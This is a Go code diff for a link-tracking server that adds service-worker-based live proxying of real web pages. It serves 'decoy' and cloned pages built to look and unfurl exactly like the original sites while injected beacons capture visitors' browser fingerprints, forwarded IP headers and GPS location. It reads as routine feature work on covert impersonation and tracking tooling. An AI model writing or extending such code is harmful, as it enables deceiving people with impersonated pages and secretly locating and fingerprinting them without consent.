@@ -8,6 +8,7 @@ import (
 	"io"
 	"log"
 	"net/http"
+	"net/url"
 	"os"
 	"path/filepath"
 	"strconv"
@@ -95,11 +96,11 @@ func (h *Handler) capture(r *http.Request, link *models.Link, eventType string) 
 
 	// Snapshot notable headers for later inspection.
 	hdr := map[string]string{
-		"X-Forwarded-For": r.Header.Get("X-Forwarded-For"),
-		"X-Real-IP":       r.Header.Get("X-Real-IP"),
-		"DNT":             r.Header.Get("DNT"),
-		"Sec-CH-UA":       r.Header.Get("Sec-CH-UA"),
-		"Sec-CH-UA-Mobile": r.Header.Get("Sec-CH-UA-Mobile"),
+		"X-Forwarded-For":    r.Header.Get("X-Forwarded-For"),
+		"X-Real-IP":          r.Header.Get("X-Real-IP"),
+		"DNT":                r.Header.Get("DNT"),
+		"Sec-CH-UA":          r.Header.Get("Sec-CH-UA"),
+		"Sec-CH-UA-Mobile":   r.Header.Get("Sec-CH-UA-Mobile"),
 		"Sec-CH-UA-Platform": r.Header.Get("Sec-CH-UA-Platform"),
 	}
 	hdrJSON, _ := json.Marshal(hdr)
@@ -267,8 +268,9 @@ func (h *Handler) Pixel(w http.ResponseWriter, r *http.Request) {
 
 // GPSPage handles GET /g/{slug}: renders the decoy page which requests
 // geolocation. If the link has an optional CloneURL configured, that real
-// page is live-proxied instead of the built-in decoy theme, with the same
-// geolocation-capture beacon injected into it.
+// page is live-proxied instead of the built-in decoy theme (via the same
+// service-worker bounce as Clone/Preview links — see GPSPageView), with the
+// same geolocation-capture beacon injected into it.
 func (h *Handler) GPSPage(w http.ResponseWriter, r *http.Request) {
 	link := h.lookupActive(w, r.PathValue("slug"))
 	if link == nil {
@@ -283,11 +285,7 @@ func (h *Handler) GPSPage(w http.ResponseWriter, r *http.Request) {
 	noStore(w)
 
 	if link.Config.CloneURL != "" {
-		beacon := gpsBeaconScript(link.Slug, eventID, link.Config.Destination)
-		if err := mirror.Serve(w, r, link.Config.CloneURL, "/g/"+link.Slug+"/r", beacon); err != nil {
-			log.Printf("gps clone: mirror %q: %v", link.Config.CloneURL, err)
-			http.Error(w, "could not load page", http.StatusBadGateway)
-		}
+		h.render(w, "mirror_loader.html", mirrorLoaderData("/g/"+link.Slug, eventID, originOf(link.Config.CloneURL)))
 		return
 	}
 
@@ -304,8 +302,46 @@ func (h *Handler) GPSPage(w http.ResponseWriter, r *http.Request) {
 	})
 }
 
-// GPSResource handles GET /g/{slug}/r: relays a sub-resource of a
-// live-proxied GPS-decoy clone page (see Config.CloneURL above).
+// GPSPageView handles GET /g/{slug}/view: serves the actual live-proxied
+// GPS-decoy clone page. See ClonePageView's doc comment — same split
+// between the service-worker-backed unmodified relay (the normal case) and
+// the ?direct=1 server-side-rewriting fallback.
+func (h *Handler) GPSPageView(w http.ResponseWriter, r *http.Request) {
+	link := h.lookupActive(w, r.PathValue("slug"))
+	if link == nil || link.Type != models.TypeGPS || link.Config.CloneURL == "" {
+		http.NotFound(w, nil)
+		return
+	}
+	eventID := atoi64(r.URL.Query().Get("eid"))
+	beacon := gpsBeaconScript(link.Slug, eventID, link.Config.Destination)
+	noStore(w)
+
+	var err error
+	if r.URL.Query().Get("direct") == "1" {
+		err = mirror.Serve(w, r, link.Config.CloneURL, "/g/"+link.Slug+"/r-legacy", beacon)
+	} else {
+		err = mirror.ServeRaw(w, r, link.Config.CloneURL, beacon)
+	}
+	if err != nil {
+		log.Printf("gps clone view: mirror %q: %v", link.Config.CloneURL, err)
+		http.Error(w, "could not load page", http.StatusBadGateway)
+	}
+}
+
+// GPSServiceWorker handles GET /g/{slug}/sw.js: serves the shared mirror
+// service worker script under this link's own scope (see
+// ClonePageServiceWorker and web/static/mirror-sw.js).
+func (h *Handler) GPSServiceWorker(w http.ResponseWriter, r *http.Request) {
+	link := h.lookupActive(w, r.PathValue("slug"))
+	if link == nil || link.Type != models.TypeGPS || link.Config.CloneURL == "" {
+		http.NotFound(w, nil)
+		return
+	}
+	h.serveMirrorSW(w)
+}
+
+// GPSResource handles /g/{slug}/r (any HTTP method): relays a single
+// request the mirror service worker intercepted from the browser.
 func (h *Handler) GPSResource(w http.ResponseWriter, r *http.Request) {
 	link := h.lookupActive(w, r.PathValue("slug"))
 	if link == nil || link.Type != models.TypeGPS || link.Config.CloneURL == "" {
@@ -317,7 +353,27 @@ func (h *Handler) GPSResource(w http.ResponseWriter, r *http.Request) {
 		http.NotFound(w, nil)
 		return
 	}
-	if err := mirror.ServeResource(w, r, u, "/g/"+link.Slug+"/r"); err != nil {
+	if err := mirror.Relay(w, r, u); err != nil {
+		http.NotFound(w, nil)
+	}
+}
+
+// GPSResourceLegacy handles GET /g/{slug}/r-legacy: the sub-resource relay
+// for the ?direct=1 fallback path (see GPSPageView) — the old
+// CSS-url(...)-rewriting ServeResource, since without a service worker
+// there's nothing else to resolve those references through this server.
+func (h *Handler) GPSResourceLegacy(w http.ResponseWriter, r *http.Request) {
+	link := h.lookupActive(w, r.PathValue("slug"))
+	if link == nil || link.Type != models.TypeGPS || link.Config.CloneURL == "" {
+		http.NotFound(w, nil)
+		return
+	}
+	u := r.URL.Query().Get("u")
+	if u == "" {
+		http.NotFound(w, nil)
+		return
+	}
+	if err := mirror.ServeResource(w, r, u, "/g/"+link.Slug+"/r-legacy"); err != nil {
 		http.NotFound(w, nil)
 	}
 }
@@ -409,11 +465,12 @@ func (h *Handler) GPSCollect(w http.ResponseWriter, r *http.Request) {
 	_, _ = w.Write([]byte(`{"ok":true}`))
 }
 
-// ClonePage handles GET /p/{slug}: live-proxies the real target page —
-// serving it directly (not a redirect, not a "Continue" button) with its
-// own title/description/OG tags intact, so the link unfurls identically to
-// the original in chat apps and opening it shows the real page. Nothing
-// from the target is downloaded or stored; every request re-fetches it.
+// ClonePage handles GET /p/{slug}: logs the view, then serves a small
+// bounce page that registers the mirror service worker (mirror-sw.js) and
+// waits for it to become active before redirecting to /p/{slug}/view — see
+// ClonePageView and web/static/mirror-sw.js for why this two-step bounce
+// exists (short version: it lets every subsequent resource fetch on the
+// view page, including the very first one, be reliably intercepted).
 func (h *Handler) ClonePage(w http.ResponseWriter, r *http.Request) {
 	link := h.lookupActive(w, r.PathValue("slug"))
 	if link == nil {
@@ -440,10 +497,51 @@ func (h *Handler) ClonePage(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
+	h.render(w, "mirror_loader.html", mirrorLoaderData("/p/"+link.Slug, eventID, originOf(dest)))
+}
+
+// ClonePageView handles GET /p/{slug}/view: serves the actual live-proxied
+// page. With the mirror service worker active (the normal case, reached via
+// the ClonePage bounce), it serves the target completely unmodified except
+// for the fingerprint beacon injected before </body> — the service worker
+// reroutes every resource fetch through ClonePageResource at the network
+// layer instead of anything being rewritten here. That's what keeps a
+// hydrated framework's client bundle (React, Next.js, etc.) seeing exactly
+// the DOM attributes it expects, so hydration succeeds where the old
+// server-side rewriter broke it.
+//
+// With ?direct=1 (set by the loader page when service workers aren't
+// available — old browsers, or JS disabled falling through to the
+// <noscript> link), it falls back to the older server-side HTML/CSS
+// rewriter (mirror.Serve) so the page still basically works without a
+// service worker, at the cost of that approach's hydration issues on
+// heavily client-rendered sites.
+func (h *Handler) ClonePageView(w http.ResponseWriter, r *http.Request) {
+	link := h.lookupActive(w, r.PathValue("slug"))
+	if link == nil {
+		return
+	}
+	if link.Type != models.TypeClone {
+		http.NotFound(w, nil)
+		return
+	}
+	dest := link.Config.Destination
+	if dest == "" {
+		http.NotFound(w, nil)
+		return
+	}
+	eventID := atoi64(r.URL.Query().Get("eid"))
 	beacon := cloneFingerprintBeacon(link.Slug, eventID)
-	if err := mirror.Serve(w, r, dest, "/p/"+link.Slug+"/r", beacon); err != nil {
-		log.Printf("clone: mirror %q: %v", dest, err)
-		// Fall back to the simple preview card rather than a bare error page.
+	noStore(w)
+
+	var err error
+	if r.URL.Query().Get("direct") == "1" {
+		err = mirror.Serve(w, r, dest, "/p/"+link.Slug+"/r-legacy", beacon)
+	} else {
+		err = mirror.ServeRaw(w, r, dest, beacon)
+	}
+	if err != nil {
+		log.Printf("clone view: mirror %q: %v", dest, err)
 		h.render(w, "clone.html", map[string]any{
 			"Slug":        link.Slug,
 			"Title":       orDefault(link.Config.Title, link.Label),
@@ -456,8 +554,66 @@ func (h *Handler) ClonePage(w http.ResponseWriter, r *http.Request) {
 	}
 }
 
-// ClonePageResource handles GET /p/{slug}/r: relays a sub-resource
-// (CSS/JS/image/font) of a live-proxied Clone/Preview page.
+// ClonePageServiceWorker handles GET /p/{slug}/sw.js: serves the shared
+// mirror service worker script (web/static/mirror-sw.js) at a path under
+// this link's own scope, so its default registration scope (/p/{slug}/)
+// covers the view page without needing a Service-Worker-Allowed header.
+func (h *Handler) ClonePageServiceWorker(w http.ResponseWriter, r *http.Request) {
+	link := h.lookupActive(w, r.PathValue("slug"))
+	if link == nil || link.Type != models.TypeClone {
+		http.NotFound(w, nil)
+		return
+	}
+	h.serveMirrorSW(w)
+}
+
+// serveMirrorSW writes the embedded mirror service worker script. Shared by
+// Clone/Preview and GPS-decoy-clone links; its actual per-link behavior
+// (target origin, relay path) is entirely parametrized via its own
+// registration URL's query string, read client-side — see mirror-sw.js.
+func (h *Handler) serveMirrorSW(w http.ResponseWriter) {
+	b, err := web.Static.ReadFile("static/mirror-sw.js")
+	if err != nil {
+		internalError(w, "serve mirror sw", err)
+		return
+	}
+	w.Header().Set("Content-Type", "application/javascript; charset=utf-8")
+	w.Header().Set("Cache-Control", "no-cache")
+	_, _ = w.Write(b)
+}
+
+// mirrorLoaderData builds the template data for the service-worker
+// registration bounce page (mirror_loader.html) shared by Clone/Preview and
+// GPS-decoy clone links. prefix is the link's own route prefix, e.g.
+// "/p/abc123" or "/g/abc123".
+func mirrorLoaderData(prefix string, eventID int64, targetOrigin string) map[string]any {
+	relay := prefix + "/r"
+	swURL := prefix + "/sw.js?origin=" + url.QueryEscape(targetOrigin) + "&relay=" + url.QueryEscape(relay)
+	viewURL := fmt.Sprintf("%s/view?eid=%d", prefix, eventID)
+	return map[string]any{
+		"SWURL":     swURL,
+		"Scope":     prefix + "/",
+		"ViewURL":   viewURL,
+		"DirectURL": viewURL + "&direct=1",
+	}
+}
+
+// originOf returns "scheme://host" for rawURL, or "" if it doesn't parse —
+// what the mirror service worker needs to reconstruct a same-origin
+// relative fetch (e.g. fetch("/api/x")) the target page's own JS made,
+// since from the browser's perspective that fetch resolves against this
+// server's origin, not the target's.
+func originOf(rawURL string) string {
+	u, err := url.Parse(rawURL)
+	if err != nil || u.Scheme == "" || u.Host == "" {
+		return ""
+	}
+	return u.Scheme + "://" + u.Host
+}
+
+// ClonePageResource handles /p/{slug}/r (any HTTP method): relays a single
+// request the mirror service worker intercepted from the browser — could be
+// a script/image/font fetch, or an XHR/fetch call the page's own JS made.
 func (h *Handler) ClonePageResource(w http.ResponseWriter, r *http.Request) {
 	link := h.lookupActive(w, r.PathValue("slug"))
 	if link == nil || link.Type != models.TypeClone {
@@ -469,7 +625,27 @@ func (h *Handler) ClonePageResource(w http.ResponseWriter, r *http.Request) {
 		http.NotFound(w, nil)
 		return
 	}
-	if err := mirror.ServeResource(w, r, u, "/p/"+link.Slug+"/r"); err != nil {
+	if err := mirror.Relay(w, r, u); err != nil {
+		http.NotFound(w, nil)
+	}
+}
+
+// ClonePageResourceLegacy handles GET /p/{slug}/r-legacy: the sub-resource
+// relay for the ?direct=1 fallback path (see ClonePageView) — kept as the
+// old CSS-url(...)-rewriting ServeResource, since without a service worker
+// there's nothing else to resolve those references through this server.
+func (h *Handler) ClonePageResourceLegacy(w http.ResponseWriter, r *http.Request) {
+	link := h.lookupActive(w, r.PathValue("slug"))
+	if link == nil || link.Type != models.TypeClone {
+		http.NotFound(w, nil)
+		return
+	}
+	u := r.URL.Query().Get("u")
+	if u == "" {
+		http.NotFound(w, nil)
+		return
+	}
+	if err := mirror.ServeResource(w, r, u, "/p/"+link.Slug+"/r-legacy"); err != nil {
 		http.NotFound(w, nil)
 	}
 }
